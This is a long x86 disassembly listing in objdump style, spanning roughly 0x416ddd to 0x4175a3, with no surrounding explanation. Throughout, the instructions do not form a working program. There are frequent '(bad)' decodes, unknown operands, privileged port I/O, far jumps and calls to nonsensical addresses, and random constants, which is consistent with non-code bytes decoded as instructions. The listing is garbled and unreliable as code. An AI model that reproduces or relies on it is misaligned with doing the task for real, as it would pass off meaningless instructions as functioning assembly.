  416ddd:	mov    WORD PTR [eax-0x1a],cs
  416de0:	mov    ecx,0x6c48f174
  416de5:	mov    al,ds:0x3184213b
  416dea:	test   BYTE PTR [ebp-0x67b1775],dh
  416df0:	or     bl,BYTE PTR [eax+0x68]
  416df3:	std    
  416df4:	xchg   esp,eax
  416df5:	and    al,0x74
  416df7:	pop    ecx
  416df9:	std    
  416dfa:	pop    esp
  416dfb:	mov    dl,BYTE PTR [edx]
  416dfd:	sbb    al,0xf5
  416dff:	test   eax,0x5f877c4b
  416e04:	or     ebx,0xa8a92265
  416e0a:	fisub  DWORD PTR [edi+0x296d4c33]
  416e10:	mov    dl,0x2
  416e12:	js     0x416e7b
  416e14:	fstp   QWORD PTR [edi]
  416e16:	mov    bp,0x5dc7
  416e1a:	and    BYTE PTR [eax-0x5f],cl
  416e1d:	and    BYTE PTR [ebx],dh
  416e1f:	xor    edi,DWORD PTR [esi]
  416e21:	dec    eax
  416e22:	push   ss
  416e23:	mov    esi,0xac8ad97a
  416e28:	ret    0xde42
  416e2b:	fcomi  st,st(2)
  416e2d:	mov    ds,WORD PTR [ebx+0x31]
  416e30:	mov    bh,0x1e
  416e32:	test   DWORD PTR [esi+0x1d],edi
  416e35:	mov    dl,0xf3
  416e37:	leave  
  416e38:	sub    ah,BYTE PTR [edx-0x5235f4b1]
  416e3e:	test   BYTE PTR [ebx+0x78],cl
  416e41:	lea    eax,[edx]
  416e43:	sbb    DWORD PTR [esp+edx*4],0x180b05ed
  416e4a:	push   ecx
  416e4b:	xlat   BYTE PTR ds:[ebx]
  416e4c:	pushf  
  416e4d:	lods   al,BYTE PTR ds:[esi]
  416e4e:	dec    edi
  416e4f:	push   ebx
  416e50:	xchg   ebx,eax
  416e51:	enter  0xad71,0x2a
  416e55:	fisubr WORD PTR [esi+0x16]
  416e58:	push   esp
  416e59:	push   eax
  416e5a:	cmp    al,0xd0
  416e5c:	jp     0x416e01
  416e5e:	sbb    ebp,esi
  416e60:	and    eax,0x28d9d151
  416e65:	dec    eax
  416e66:	popa   
  416e67:	sbb    eax,0xfe4653e6
  416e6c:	scas   al,BYTE PTR es:[edi]
  416e6d:	mov    esp,0x6aec8c0e
  416e72:	ins    DWORD PTR es:[edi],dx
  416e73:	inc    eax
  416e74:	popf   
  416e75:	mov    cl,0xd8
  416e77:	jae    0x416e2f
  416e79:	ds test al,0x4e
  416e7c:	mov    edi,0xc588b5ae
  416e81:	cmp    esi,ecx
  416e83:	popa   
  416e84:	out    0xa6,al
  416e86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e88:	mov    al,0x0
  416e8a:	cld    
  416e8b:	test   edx,eax
  416e8d:	popa   
  416e8e:	jns    0x416e69
  416e90:	ficomp WORD PTR [eax]
  416e92:	pop    ss
  416e93:	dec    esp
  416e94:	pop    es
  416e95:	addr16 mov bh,0xcd
  416e98:	xchg   ebp,eax
  416e99:	inc    ebx
  416e9a:	repnz lds esp,FWORD PTR [edi]
  416e9d:	addr16 dec ebp
  416e9f:	mov    ecx,0xad72a3d8
  416ea4:	js     0x416e7c
  416ea6:	cmp    edx,DWORD PTR [bx+0x6f89]
  416eab:	cmc    
  416eac:	mov    ?,WORD PTR [ebx+ecx*2+0x46]
  416eb0:	bound  eax,QWORD PTR [ecx-0xa]
  416eb3:	div    DWORD PTR [esp+0x5ee0cdad]
  416eba:	popf   
  416ebb:	test   cl,al
  416ebd:	sar    DWORD PTR [edi],0x9d
  416ec0:	or     BYTE PTR [esi+ecx*8+0x6d],dh
  416ec4:	cwde   
  416ec5:	xchg   esp,eax
  416ec6:	daa    
  416ec7:	daa    
  416ec8:	retf   
  416ec9:	shr    BYTE PTR [edi-0x2b3a2fee],0x7a
  416ed0:	push   es
  416ed1:	fild   WORD PTR [esi+0x64]
  416ed4:	fsub   QWORD PTR [esi+0xb]
  416ed7:	xor    eax,0xd1a7a92d
  416edc:	clc    
  416edd:	mov    ebx,0x4b9b31b5
  416ee2:	jae    0x416ebc
  416ee4:	fs and eax,0x4cdd9b
  416eea:	sbb    al,0xfb
  416eec:	sub    ebx,ebp
  416eee:	xor    eax,0xed6a4768
  416ef3:	cmp    DWORD PTR [ebp+esi*1-0xed1cffb],edx
  416efa:	ins    DWORD PTR es:[edi],dx
  416efb:	(bad)  
  416efc:	cmp    al,0xfc
  416efe:	fcom   QWORD PTR [eax+0x6d]
  416f01:	cdq    
  416f02:	jns    0x416eac
  416f04:	in     al,dx
  416f05:	sti    
  416f06:	mov    eax,ds:0x1ab97451
  416f0b:	sti    
  416f0c:	xchg   edx,eax
  416f0d:	jecxz  0x416edc
  416f0f:	and    DWORD PTR [esi+0x7d],edi
  416f12:	fadd   st,st(0)
  416f14:	inc    edi
  416f15:	fs mov cl,0x7f
  416f18:	fld    QWORD PTR [edi-0x145faf66]
  416f1e:	cwde   
  416f1f:	push   ebx
  416f20:	ds ret 0x68d9
  416f24:	mov    eax,0xd4696f71
  416f29:	shl    DWORD PTR [edi+0x312d4ba8],1
  416f2f:	mov    eax,0x29a779ad
  416f34:	stos   DWORD PTR es:[edi],eax
  416f35:	icebp  
  416f36:	sbb    eax,0xa1b25bfd
  416f3b:	std    
  416f3c:	std    
  416f3d:	dec    edi
  416f3e:	xchg   edx,eax
  416f3f:	imul   esi,edx,0x49309969
  416f45:	add    esp,DWORD PTR [ebx]
  416f47:	inc    esp
  416f48:	test   eax,0xaf2f8b38
  416f4d:	cdq    
  416f4e:	js     0x416f63
  416f50:	mov    ds:0xcdace47c,eax
  416f55:	es jo  0x416f4c
  416f58:	and    eax,0xfa8e523f
  416f5d:	dec    esi
  416f5e:	jecxz  0x416f33
  416f60:	pop    ebx
  416f61:	adc    al,0xeb
  416f63:	data16 adc BYTE PTR [edi],al
  416f66:	adc    BYTE PTR [edx],bh
  416f68:	add    al,0xa4
  416f6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f6b:	mov    dh,0xc0
  416f6d:	push   esp
  416f6e:	push   ecx
  416f6f:	jle    0x416fdc
  416f71:	gs pop esp
  416f73:	xor    al,0xe0
  416f75:	sub    al,0x9b
  416f77:	or     BYTE PTR [ecx-0x17],0x17
  416f7b:	pop    edx
  416f7c:	or     DWORD PTR [edi-0xfa5d4da],esi
  416f82:	pop    es
  416f83:	push   DWORD PTR [ecx-0x5a3cc0f4]
  416f89:	and    al,0x6f
  416f8b:	pop    esp
  416f8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f8d:	fistp  WORD PTR [esi-0x25]
  416f90:	pushf  
  416f91:	inc    ecx
  416f92:	jbe    0x416fd8
  416f94:	sahf   
  416f95:	adc    al,0x32
  416f97:	(bad)  [esi]
  416f99:	jno    0x417008
  416f9b:	mov    ebp,0xc709ab36
  416fa0:	add    ch,BYTE PTR [edi+ebx*2-0x1c03ba3c]
  416fa7:	jnp    0x416f76
  416fa9:	push   ds
  416faa:	push   0x9b7a69f2
  416faf:	test   DWORD PTR [ebp-0x1343cb02],edx
  416fb5:	dec    ebx
  416fb6:	mov    cl,0x38
  416fb8:	push   eax
  416fb9:	xchg   DWORD PTR [esi],edi
  416fbb:	jne    0x416f77
  416fbd:	enter  0xe957,0x6e
  416fc1:	jge    0x416f7d
  416fc3:	inc    esi
  416fc4:	and    al,0x15
  416fc6:	test   eax,0xfce13dcb
  416fcb:	shl    BYTE PTR [ecx+0x5e202822],1
  416fd1:	ror    DWORD PTR [edx+ebx*4],cl
  416fd4:	push   esi
  416fd5:	mov    edx,0x1a13b783
  416fda:	add    dh,BYTE PTR [esi+0x6]
  416fdd:	outs   dx,DWORD PTR ds:[esi]
  416fde:	xor    DWORD PTR [ecx],0xdbd7ebbe
  416fe4:	ins    DWORD PTR es:[edi],dx
  416fe5:	xlat   BYTE PTR ds:[ebx]
  416fe6:	ficomp DWORD PTR ds:0xd4c0ae33
  416fec:	(bad)  
  416fed:	call   0x69cf2952
  416ff2:	test   al,0x9c
  416ff4:	cmp    ah,bl
  416ff6:	mov    ebx,0xc774dd43
  416ffb:	dec    esp
  416ffc:	inc    esi
  416ffd:	mov    edi,0x1a749fe4
  417002:	loopne 0x41703a
  417004:	jg     0x41700b
  417006:	loopne 0x416ff3
  417008:	jmp    0xe33a:0x94074ce2
  41700f:	dec    esp
  417010:	shr    al,0x46
  417013:	sub    eax,0xfb93fadb
  417018:	scas   al,BYTE PTR es:[edi]
  417019:	test   BYTE PTR [ecx+ecx*8-0x21706afd],cl
  417020:	fldenv [eax-0x2f]
  417023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417024:	sahf   
  417025:	clc    
  417026:	dec    esi
  417027:	dec    BYTE PTR [esi-0x6a]
  41702a:	sbb    DWORD PTR [edi],eax
  41702c:	stos   BYTE PTR es:[edi],al
  41702d:	or     eax,0xf890ded
  417032:	push   esp
  417033:	leave  
  417034:	or     eax,0x694521dc
  417039:	outs   dx,DWORD PTR ds:[esi]
  41703a:	in     eax,0x36
  41703c:	sub    bl,al
  41703e:	sbb    eax,0x7d0ce0e0
  417043:	das    
  417044:	fwait
  417045:	mov    al,ds:0x9032f9ab
  41704a:	mov    esp,0xc3d089fb
  41704f:	fs pushf 
  417051:	xor    bh,BYTE PTR [ecx+eax*8]
  417054:	sub    ecx,ebx
  417056:	inc    esi
  417057:	cmp    eax,0x56dc7cb8
  41705c:	cld    
  41705d:	pop    ebp
  41705e:	cmp    BYTE PTR [edi+0x60],cl
  417061:	cli    
  417062:	cs iret 
  417064:	adc    ch,ah
  417066:	out    0x76,al
  417068:	mov    ds:0xe926d815,al
  41706d:	dec    ecx
  41706e:	xchg   edi,eax
  41706f:	inc    edx
  417070:	sbb    al,0xa9
  417072:	xchg   esp,eax
  417073:	push   eax
  417074:	repnz push ss
  417076:	out    dx,al
  417077:	pop    es
  417078:	jbe    0x417071
  41707a:	or     al,0x2b
  41707c:	xor    dh,cl
  41707e:	loop   0x417011
  417080:	push   eax
  417081:	in     al,dx
  417082:	or     DWORD PTR [ebx+0xd],esi
  417085:	enter  0x1f1f,0x2d
  417089:	or     edx,DWORD PTR [ecx]
  41708b:	adc    BYTE PTR [ebp-0x2],0x11
  41708f:	arpl   WORD PTR [edx],cx
  417091:	jo     0x4170ff
  417093:	scas   al,BYTE PTR es:[edi]
  417094:	test   al,0xd2
  417096:	fidiv  WORD PTR [ebp+0x76]
  417099:	pop    edx
  41709a:	in     eax,dx
  41709b:	pop    eax
  41709c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41709d:	inc    esp
  41709e:	test   al,al
  4170a0:	pop    esp
  4170a1:	imul   eax,ebp,0x5bd5b091
  4170a7:	cwde   
  4170a8:	popa   
  4170a9:	cwde   
  4170aa:	div    esp
  4170ac:	(bad)  
  4170ad:	cmp    bl,al
  4170af:	jns    0x41705f
  4170b1:	xor    edx,ecx
  4170b3:	or     bl,bh
  4170b5:	and    ebx,edx
  4170b7:	sub    eax,0x2263c4c
  4170bc:	cwde   
  4170bd:	(bad)  
  4170be:	shl    edi,cl
  4170c0:	ss cmc 
  4170c2:	idiv   esp
  4170c4:	cld    
  4170c5:	push   ss
  4170c6:	rcr    BYTE PTR [esi-0x72],0x54
  4170ca:	add    eax,edx
  4170cc:	out    dx,al
  4170cd:	and    al,0xd2
  4170cf:	(bad)  
  4170d0:	cmp    eax,0x3ae8026b
  4170d5:	xchg   ecx,eax
  4170d6:	out    dx,al
  4170d7:	push   ss
  4170d8:	pop    esp
  4170d9:	lods   al,BYTE PTR ds:[esi]
  4170da:	adc    BYTE PTR [esi],bh
  4170dc:	mov    BYTE PTR [edx+esi*4+0x54b05d68],0x37
  4170e4:	scas   al,BYTE PTR es:[edi]
  4170e5:	fmul   DWORD PTR ds:0x7e7e31e6
  4170eb:	dec    eax
  4170ec:	(bad)  
  4170ed:	retf   
  4170ee:	cli    
  4170ef:	pop    es
  4170f0:	and    DWORD PTR [esi+0x6b],ebp
  4170f3:	sbb    BYTE PTR [esi-0x49],0x3a
  4170f7:	adc    BYTE PTR [esi],0x59
  4170fa:	repnz iret 
  4170fc:	mov    eax,ds:0x2907d034
  417101:	mov    dh,BYTE PTR ds:0xa1323740
  417107:	cld    
  417108:	shr    DWORD PTR [ecx-0x6f16d376],cl
  41710e:	mov    bl,0xa9
  417110:	fs je  0x4170a8
  417113:	retf   
  417114:	iret   
  417115:	inc    esp
  417116:	leave  
  417117:	or     ch,BYTE PTR [ecx-0xb23a8af]
  41711d:	aaa    
  41711e:	jb     0x417176
  417120:	inc    esi
  417121:	inc    ebp
  417122:	push   cs
  417123:	cdq    
  417124:	sub    eax,0xf01f2bae
  417129:	jg     0x417121
  41712b:	sub    esp,DWORD PTR [eax-0x20]
  41712e:	sub    DWORD PTR [eax],esi
  417130:	mov    edx,0x6ead7a51
  417135:	xlat   BYTE PTR ds:[ebx]
  417136:	sub    DWORD PTR [ebp+0x4c],eax
  417139:	ss push es
  41713b:	call   0xea9b7c19
  417140:	jns    0x41712d
  417142:	fadd   st,st(0)
  417144:	ss jnp 0x417113
  417147:	aaa    
  417148:	inc    esi
  417149:	cmp    ebx,DWORD PTR [eax+0x51]
  41714c:	xchg   esp,eax
  41714d:	fistp  WORD PTR [eax]
  41714f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417150:	ret    0xd116
  417153:	add    eax,0x26507f64
  417158:	jmp    0x8354e3b4
  41715d:	push   es
  41715e:	mov    dh,BYTE PTR [edi]
  417160:	mov    al,0xd2
  417162:	push   0xc911b237
  417167:	mov    ecx,0xddedd24b
  41716c:	mov    cl,0xbc
  41716e:	in     al,0xe2
  417170:	adc    ecx,eax
  417172:	xor    ebx,ebx
  417174:	outs   dx,DWORD PTR ds:[esi]
  417175:	pmaddwd mm4,QWORD PTR [ebx+0x11c521ac]
  41717c:	push   ecx
  41717d:	jge    0x4171c4
  41717f:	fwait
  417180:	jns    0x41719a
  417182:	mov    ds:0x165c44a9,al
  417187:	add    DWORD PTR [eax-0x52d3dced],edi
  41718d:	scas   al,BYTE PTR es:[edi]
  41718e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41718f:	xor    al,0x44
  417191:	outs   dx,BYTE PTR ds:[esi]
  417192:	data16 int3 
  417194:	or     eax,0xdb92982b
  417199:	outs   dx,BYTE PTR ds:[esi]
  41719a:	pop    ecx
  41719b:	pop    esi
  41719c:	in     al,dx
  41719d:	ins    BYTE PTR es:[edi],dx
  41719e:	add    ah,BYTE PTR gs:[esi+ebx*1-0x525b2b32]
  4171a6:	or     DWORD PTR [ebp-0x90cf238],edi
  4171ac:	pushf  
  4171ad:	fdivr  DWORD PTR [edi]
  4171af:	enter  0x8c48,0x2e
  4171b3:	pop    ebx
  4171b4:	loope  0x417191
  4171b6:	jl     0x4171a9
  4171b8:	mov    ?,WORD PTR [edi]
  4171ba:	mov    ch,0xcc
  4171bc:	in     eax,dx
  4171bd:	aad    0xf7
  4171bf:	rcr    BYTE PTR [ebp-0x20],1
  4171c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171c3:	addr16 shr ch,1
  4171c6:	(bad)  
  4171c7:	xchg   esp,eax
  4171c8:	jge    0x4171c5
  4171ca:	cmp    eax,0x3f3786d
  4171cf:	cld    
  4171d0:	sbb    edx,DWORD PTR [ecx]
  4171d2:	cmc    
  4171d3:	jns    0x417188
  4171d5:	into   
  4171d6:	test   al,0xee
  4171d8:	aas    
  4171d9:	jb     0x4171ad
  4171db:	aad    0xea
  4171dd:	out    dx,al
  4171de:	cld    
  4171df:	jns    0x4171c8
  4171e1:	repz cmc 
  4171e3:	fs ret 0xcee8
  4171e7:	call   0xa170676
  4171ec:	xchg   DWORD PTR [eax+eiz*1-0x55e7e0ff],esi
  4171f3:	pop    esp
  4171f4:	pop    ds
  4171f5:	dec    esp
  4171f6:	sub    si,0x9
  4171fa:	push   ebx
  4171fb:	push   es
  4171fc:	cmc    
  4171fd:	pop    es
  4171fe:	jbe    0x417181
  417200:	addr16 cdq 
  417202:	(bad)  
  417203:	mov    es,esi
  417205:	syscall 
  417207:	mov    esi,eax
  417209:	jo     0x417263
  41720b:	sub    al,0x76
  41720d:	add    DWORD PTR [ebx],ecx
  41720f:	stc    
  417210:	loope  0x417252
  417212:	fnstcw WORD PTR [esi+0x4]
  417215:	xor    al,0x7e
  417217:	pop    ebp
  417218:	dec    ebx
  417219:	mov    DWORD PTR ds:0xdb86eb2a,ebp
  41721f:	aaa    
  417220:	jo     0x417264
  417222:	das    
  417223:	ins    DWORD PTR es:[edi],dx
  417224:	jbe    0x417256
  417226:	out    dx,eax
  417227:	mov    dl,BYTE PTR [ebx]
  417229:	aas    
  41722a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41722b:	mov    dh,ah
  41722d:	dec    edi
  41722e:	cdq    
  41722f:	rcl    DWORD PTR [ebx],0x4b
  417232:	mov    al,0x2f
  417234:	mov    dl,0x4b
  417236:	fist   DWORD PTR gs:[edi+0x57dd7f4a]
  41723d:	test   ebp,ebx
  41723f:	into   
  417240:	rcr    DWORD PTR [ecx],1
  417242:	dec    ebx
  417243:	fistp  QWORD PTR [edx-0x59dfc845]
  417249:	xchg   ecx,eax
  41724a:	test   dl,ah
  41724c:	in     eax,0xca
  41724e:	dec    esi
  41724f:	lods   al,BYTE PTR ds:[esi]
  417250:	cmp    BYTE PTR [ebp+0x38],bl
  417253:	call   0x5996d142
  417258:	mov    ecx,DWORD PTR [ecx]
  41725a:	inc    ecx
  41725b:	cmc    
  41725c:	scas   eax,DWORD PTR es:[edi]
  41725d:	dec    ebx
  41725e:	ret    
  41725f:	call   0xf6448136
  417264:	sbb    eax,0xeec184ae
  417269:	clc    
  41726a:	cdq    
  41726b:	sbb    edi,ecx
  41726d:	test   BYTE PTR [ebx+0x68101a72],bl
  417273:	mov    ebx,0xd2cf1f45
  417278:	std    
  417279:	and    al,0x38
  41727b:	or     al,0xca
  41727d:	jge    0x41726d
  41727f:	add    eax,ecx
  417281:	(bad)  
  417282:	in     al,0xcb
  417284:	in     eax,0x98
  417286:	add    al,0x2b
  417288:	jecxz  0x41725a
  41728a:	jo     0x4172d5
  41728c:	jle    0x417253
  41728e:	out    dx,al
  41728f:	xchg   ecx,eax
  417290:	(bad)  
  417291:	xchg   ebp,eax
  417292:	pop    esi
  417293:	call   0xbb7f:0xab58a345
  41729a:	jne    0x41724c
  41729c:	and    al,0xe9
  41729e:	ins    BYTE PTR es:[edi],dx
  41729f:	inc    esi
  4172a0:	or     BYTE PTR [ecx+0x64],al
  4172a3:	mov    al,0xbb
  4172a5:	xchg   BYTE PTR [ebx+ebp*4],bh
  4172a8:	jmp    0x365859b4
  4172ad:	mov    al,0xe2
  4172af:	retf   0x3171
  4172b2:	aas    
  4172b3:	in     eax,0x6a
  4172b5:	adc    DWORD PTR [ecx-0x80],eax
  4172b8:	js     0x4172cf
  4172ba:	sbb    edx,DWORD PTR gs:[ebx+edx*2+0x446fd4dc]
  4172c2:	scas   eax,DWORD PTR es:[edi]
  4172c3:	shl    DWORD PTR [esi-0x6d],1
  4172c6:	in     al,dx
  4172c7:	xchg   edx,eax
  4172c8:	into   
  4172c9:	mov    dl,0xd9
  4172cb:	mov    dl,0xb5
  4172cd:	xchg   esp,eax
  4172ce:	pop    esp
  4172cf:	hlt    
  4172d0:	push   ecx
  4172d1:	cmc    
  4172d2:	sub    DWORD PTR [ebx],0xe12ff16d
  4172d8:	pop    ebp
  4172d9:	dec    esi
  4172da:	rol    DWORD PTR [ebx+0x15],0xf6
  4172de:	sub    DWORD PTR [ebx+0x33],ebx
  4172e1:	enter  0x952b,0x71
  4172e5:	imul   ebp,DWORD PTR [eax],0xffffffc2
  4172e8:	add    eax,0xa22c153e
  4172ed:	jo     0x417320
  4172ef:	push   ds
  4172f0:	out    0xd2,al
  4172f2:	push   edx
  4172f3:	(bad)  
  4172f4:	mov    ds:0x9f069b2d,al
  4172f9:	inc    edi
  4172fa:	xorps  xmm0,XMMWORD PTR ds:0x88389f97
  417301:	in     eax,dx
  417302:	stos   DWORD PTR es:[edi],eax
  417303:	loopne 0x417323
  417305:	in     al,0xd
  417307:	(bad)  
  417308:	xor    dl,BYTE PTR [esi+0x1b89ee13]
  41730e:	xor    DWORD PTR [eax],ebp
  417310:	repnz (bad) 
  417312:	loop   0x4172a6
  417314:	xchg   edi,eax
  417315:	fidiv  DWORD PTR [edi+0x7e]
  417318:	jnp    0x41733f
  41731a:	cmc    
  41731b:	(bad)
  41731e:	dec    eax
  41731f:	jb     0x4172c3
  417321:	lods   eax,DWORD PTR ds:[esi]
  417322:	test   eax,0xc1c2ba61
  417327:	test   BYTE PTR [edx-0x52],ah
  41732a:	inc    edi
  41732b:	xor    DWORD PTR [ebx+eiz*8],ebp
  41732e:	cmp    ebp,esp
  417330:	cs or  eax,0x8479fa8c
  417336:	addr16 sub eax,0x3a064927
  41733c:	outs   dx,DWORD PTR ds:[esi]
  41733d:	dec    eax
  41733e:	add    al,dh
  417340:	mov    WORD PTR [ecx+0x57],es
  417343:	and    BYTE PTR [eax+ecx*2+0x4d],cl
  417347:	les    ecx,FWORD PTR [eax]
  417349:	mov    al,ds:0xc54fa221
  41734e:	gs loope 0x417374
  417351:	loopne 0x41739b
  417353:	fidiv  WORD PTR [edx-0x27244cd5]
  417359:	sub    al,BYTE PTR [ebp+0x62]
  41735c:	sar    BYTE PTR [edi+0x37],cl
  41735f:	push   esi
  417360:	(bad)  
  417361:	(bad)  
  417362:	fmul   QWORD PTR [esi]
  417364:	jp     0x41732c
  417366:	inc    esi
  417367:	jmp    0xbc7aaa7f
  41736c:	out    0x94,al
  41736e:	cs hlt 
  417370:	lods   al,BYTE PTR ds:[esi]
  417371:	outs   dx,DWORD PTR ds:[esi]
  417372:	ds neg bh
  417375:	popa   
  417376:	aas    
  417377:	add    al,0xc6
  417379:	inc    ebp
  41737a:	jl     0x41732d
  41737c:	sub    al,bl
  41737e:	jmp    0x417356
  417380:	mov    esi,eax
  417382:	popf   
  417383:	push   ebp
  417384:	add    ah,al
  417386:	and    DWORD PTR [edx-0x6205967],edi
  41738c:	and    eax,esi
  41738e:	in     al,0xc4
  417390:	or     BYTE PTR [ebx+ebp*2+0x39383ba2],cl
  417397:	push   ebx
  417398:	mov    esi,0xbce676c
  41739d:	jle    0x417394
  41739f:	lods   al,BYTE PTR ds:[esi]
  4173a0:	sub    bh,BYTE PTR [ebx+esi*2-0x36]
  4173a4:	dec    eax
  4173a5:	retf   0x99ac
  4173a8:	lock xchg ecx,eax
  4173aa:	ins    BYTE PTR es:[edi],dx
  4173ab:	sub    eax,0x14e4d6ee
  4173b0:	stos   BYTE PTR es:[edi],al
  4173b1:	mov    ebx,0x5db443ac
  4173b6:	ret    0xb3e8
  4173b9:	(bad)  
  4173ba:	or     eax,0xbd6bd518
  4173bf:	iret   
  4173c0:	cmp    al,0x93
  4173c2:	and    DWORD PTR [esi],esp
  4173c4:	mov    gs,WORD PTR [edi-0x28]
  4173c7:	sbb    DWORD PTR [ecx-0x46f6dfcd],esi
  4173cd:	dec    esi
  4173ce:	push   cs
  4173cf:	jbe    0x417377
  4173d1:	sar    BYTE PTR [ecx-0x2eb2dab8],1
  4173d7:	add    bh,BYTE PTR [esi+0x68217d39]
  4173dd:	xor    al,0xb6
  4173df:	jg     0x41738e
  4173e1:	dec    eax
  4173e2:	loope  0x417414
  4173e4:	cmp    al,dh
  4173e6:	rcr    DWORD PTR [esi],1
  4173e8:	xchg   ebp,eax
  4173e9:	pop    es
  4173ea:	xor    esi,DWORD PTR [edx]
  4173ec:	lds    ebp,FWORD PTR [ecx+esi*2-0xa]
  4173f0:	mov    ds:0x99e4c1f,eax
  4173f5:	pop    eax
  4173f6:	mov    edi,edx
  4173f8:	(bad)  
  4173f9:	xlat   BYTE PTR gs:[ebx]
  4173fb:	adc    BYTE PTR [edx],cl
  4173fd:	scas   eax,DWORD PTR es:[edi]
  4173fe:	ins    DWORD PTR es:[edi],dx
  4173ff:	ss inc ebx
  417401:	lds    ecx,FWORD PTR [ecx+0x23]
  417404:	enter  0x7851,0xff
  417408:	sub    dh,BYTE PTR fs:[eax-0x70681dde]
  41740f:	or     BYTE PTR [ebp-0x5be55071],0x8
  417416:	ins    BYTE PTR es:[edi],dx
  417417:	and    edx,DWORD PTR [ebp-0x3d]
  41741a:	jmp    0xabba8634
  41741f:	clc    
  417420:	pusha  
  417421:	in     eax,dx
  417422:	fnsave [eax+0x53]
  417425:	sbb    al,BYTE PTR ds:0xb1b79880
  41742b:	adc    DWORD PTR [ebp-0xebcd052],edi
  417431:	ror    DWORD PTR ds:0xfb397c88,0x40
  417438:	add    eax,0x317d18c4
  41743d:	stc    
  41743e:	push   esp
  41743f:	add    bl,bh
  417441:	(bad)  
  417442:	mov    esp,0xd6cfeb97
  417447:	stos   BYTE PTR es:[edi],al
  417448:	sbb    al,0x1b
  41744a:	adc    BYTE PTR [eax],al
  41744c:	xchg   ebp,ebp
  41744e:	cli    
  41744f:	xchg   esi,eax
  417450:	jle    0x41744c
  417452:	in     eax,dx
  417453:	sti    
  417454:	mov    bh,0x71
  417456:	mov    ah,0x4b
  417458:	ret    0xcfb4
  41745b:	cmp    bl,BYTE PTR [ecx+0x8b7448]
  417461:	mov    al,0x22
  417463:	stc    
  417464:	or     ch,BYTE PTR ss:[eax]
  417467:	retf   
  417468:	sbb    ecx,DWORD PTR [esi+0x3]
  41746b:	aaa    
  41746c:	or     BYTE PTR [edi-0x13785556],0x4
  417473:	mov    eax,0xbeff2023
  417478:	jge    0x417411
  41747a:	js     0x417489
  41747c:	call   0xff688d4a
  417481:	fld    QWORD PTR [esi+0x6f]
  417484:	addr16 dec ebx
  417486:	imul   ecx,ebx,0x5af3b850
  41748c:	mov    ch,0x2f
  41748e:	inc    edx
  41748f:	mov    ds,ebp
  417491:	pop    ebx
  417492:	aam    0x10
  417494:	mov    bh,0xb4
  417496:	add    eax,0x3e2c7c03
  41749b:	aad    0xdd
  41749d:	and    BYTE PTR [ebx+0x73b29c90],bh
  4174a3:	mov    edi,0x3293efc0
  4174a8:	inc    edx
  4174a9:	inc    DWORD PTR [ecx+0x6a746943]
  4174af:	mov    edi,DWORD PTR [edi+ebx*1-0x66]
  4174b3:	jnp    0x4174b9
  4174b5:	or     al,0xeb
  4174b7:	or     al,0x3f
  4174b9:	call   0x2b95:0xb276cad0
  4174c0:	popf   
  4174c1:	adc    bh,BYTE PTR [esp+ecx*4+0x139e49b5]
  4174c8:	fistp  DWORD PTR [edi-0x3693e023]
  4174ce:	sub    bl,bh
  4174d0:	bound  ebp,QWORD PTR ds:0xa28b48e3
  4174d6:	out    dx,al
  4174d7:	clc    
  4174d8:	or     eax,0xff146ce6
  4174dd:	xchg   edi,eax
  4174de:	nop
  4174df:	cmp    bl,BYTE PTR [eax+0x6d]
  4174e2:	cmp    ebx,ebx
  4174e4:	fcomp  DWORD PTR [eax+0x67c2c763]
  4174ea:	fwait
  4174eb:	push   0xffffffdc
  4174ed:	pop    es
  4174ee:	es das 
  4174f0:	push   0x5e
  4174f2:	sbb    DWORD PTR [edi*8+0x4251e955],esp
  4174f9:	in     eax,dx
  4174fa:	pop    es
  4174fb:	xchg   edi,eax
  4174fc:	mov    al,0x3b
  4174fe:	lods   al,BYTE PTR ds:[esi]
  4174ff:	in     al,dx
  417500:	inc    ebp
  417501:	ins    BYTE PTR es:[edi],dx
  417502:	dec    edx
  417503:	add    al,0x3e
  417505:	rcr    BYTE PTR [ecx-0x24ce1379],cl
  41750b:	sti    
  41750c:	loope  0x41753f
  41750e:	mov    eax,0x1dd2aff2
  417513:	cmp    DWORD PTR [edi-0x1279031b],ebx
  417519:	out    dx,al
  41751a:	leave  
  41751b:	jno    0x41754f
  41751d:	(bad)  
  41751e:	adc    DWORD PTR [esp+eiz*4-0x1a],ebp
  417522:	jmp    0xf1b3:0x3f6ca99d
  417529:	fild   DWORD PTR [ecx-0x7160945a]
  41752f:	ins    DWORD PTR es:[edi],dx
  417530:	jmp    0x417588
  417532:	ins    DWORD PTR es:[edi],dx
  417533:	iret   
  417534:	repnz scas eax,DWORD PTR es:[edi]
  417536:	fldenv [ebx-0x4b]
  417539:	stos   DWORD PTR es:[edi],eax
  41753a:	das    
  41753b:	xchg   ebp,eax
  41753c:	push   0xa1e63655
  417541:	test   al,0x48
  417543:	adc    eax,0x707b0061
  417548:	jne    0x4175bc
  41754a:	adc    DWORD PTR [ebx],esi
  41754c:	jbe    0x417525
  41754e:	dec    ebx
  41754f:	cmp    BYTE PTR [esi-0x13bc7e08],ah
  417555:	test   al,0x20
  417557:	imul   ebp,DWORD PTR [edx+0x46],0x1ee254f
  41755e:	xchg   edi,eax
  41755f:	mov    bl,0x6f
  417561:	les    ecx,FWORD PTR [ebx+esi*8-0x35]
  417565:	loopne 0x4175ce
  417567:	push   0xc1cebde1
  41756c:	loope  0x4174f2
  41756e:	(bad)  
  41756f:	call   0x507:0xdf9476ba
  417576:	sbb    eax,0xda6b8435
  41757b:	test   BYTE PTR [esi],ch
  41757d:	sub    eax,0xeeac9505
  417582:	add    bh,dl
  417584:	scas   al,BYTE PTR es:[edi]
  417585:	jb     0x41753f
  417587:	das    
  417588:	out    0x29,eax
  41758a:	ins    DWORD PTR es:[edi],dx
  41758b:	call   0x9853:0x92049f2e
  417592:	mov    dh,0xec
  417594:	lods   al,BYTE PTR ds:[esi]
  417595:	dec    esp
  417596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417597:	push   es
  417598:	mov    ch,BYTE PTR [ecx+0x3aed3baa]
  41759e:	xor    DWORD PTR [edx-0x11],ebx
  4175a1:	or     al,al
  4175a3:	out    dx,al
